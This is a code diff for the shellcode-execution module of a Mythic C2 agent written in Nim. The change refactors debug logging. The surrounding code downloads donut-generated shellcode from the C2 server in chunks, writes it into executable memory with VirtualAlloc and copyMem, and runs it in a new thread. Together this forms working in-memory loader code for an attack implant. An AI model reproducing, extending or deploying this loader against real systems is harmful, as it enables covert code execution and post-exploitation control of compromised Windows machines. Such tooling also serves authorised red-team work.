@@ -1,5 +1,5 @@
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import std/[json, base64, strformat]
 
 when defined(windows):
@@ -21,15 +21,12 @@ proc donut*(taskId: string, params: JsonNode): JsonNode =
   ## Execute .NET assembly via donut-generated shellcode
   ## The Python side converts the assembly to shellcode using donut
   ## This nim side downloads and executes that shellcode
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
       let args = to(params, DonutArgs)
       
-      if cfg.debug:
-        echo "[DEBUG] Donut execution: ", args.assembly_name
-        echo "[DEBUG] UUID for download: ", args.uuid
+      debug &"[DEBUG] Donut execution: {args.assembly_name}"
+      debug &"[DEBUG] UUID for download: {args.uuid}"
       
       # Return initial response - request the file from Mythic
       return %*{
@@ -54,15 +51,13 @@ proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string,
   when defined(windows):
     try:
       let args = to(params, DonutArgs)
-      let cfg = getConfig()
       
       # Decode and append chunk data
       let decodedChunk = decode(chunkData)
       for b in decodedChunk:
         fileData.add(cast[byte](b))
       
-      if cfg.debug:
-        echo &"[DEBUG] Donut: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
+      debug &"[DEBUG] Donut: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
       
       # If more chunks remain, request the next one
       if currentChunk < totalChunks:
@@ -87,14 +82,11 @@ proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string,
 proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
   ## Execute the downloaded donut shellcode
   ## This is called after the shellcode download is complete
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
       let args = to(params, DonutArgs)
       
-      if cfg.debug:
-        echo "[DEBUG] Executing donut shellcode (", shellcode.len, " bytes)"
+      debug &"[DEBUG] Executing donut shellcode ({shellcode.len} bytes)"
       
       var output = ""
       
@@ -128,8 +120,7 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
       if shellcode.len == 0:
         return mythicError(taskId, "Shellcode is empty - file download may have failed")
       
-      if cfg.debug:
-        echo &"[DEBUG] Donut: Allocating {shellcode.len} bytes for shellcode"
+      debug &"[DEBUG] Donut: Allocating {shellcode.len} bytes for shellcode"
       
       # Allocate executable memory
       let pShellcode = VirtualAlloc(
@@ -143,14 +134,12 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
         let err = GetLastError()
         return mythicError(taskId, &"Failed to allocate memory for shellcode: VirtualAlloc failed with error {err} (size: {shellcode.len} bytes)")
       
-      if cfg.debug:
-        echo &"[DEBUG] Donut: Memory allocated, copying shellcode"
+      debug &"[DEBUG] Donut: Memory allocated, copying shellcode"
       
       # Copy shellcode to allocated memory
       copyMem(pShellcode, unsafeAddr shellcode[0], shellcode.len)
       
-      if cfg.debug:
-        echo &"[DEBUG] Donut: Creating execution thread"
+      debug "[DEBUG] Donut: Creating execution thread"
       
       # Create thread to execute shellcode
       var threadId: DWORD
@@ -172,13 +161,11 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
       let timeoutMs = if args.timeout > 0: DWORD(args.timeout * 1000) else: 30000  # Default 30s like oopsie
       let timeoutSec = if args.timeout > 0: args.timeout else: 30
       
-      if cfg.debug:
-        echo &"[DEBUG] Donut: Waiting for execution to complete (timeout: {timeoutSec}s)"
+      debug &"[DEBUG] Donut: Waiting for execution to complete (timeout: {timeoutSec}s)"
       
       let waitResult = WaitForSingleObject(hThread, timeoutMs)
       
-      if cfg.debug:
-        echo &"[DEBUG] Donut: Wait completed with result: {waitResult}"
+      debug &"[DEBUG] Donut: Wait completed with result: {waitResult}"
       
       # Append execution result to output
       case waitResult:
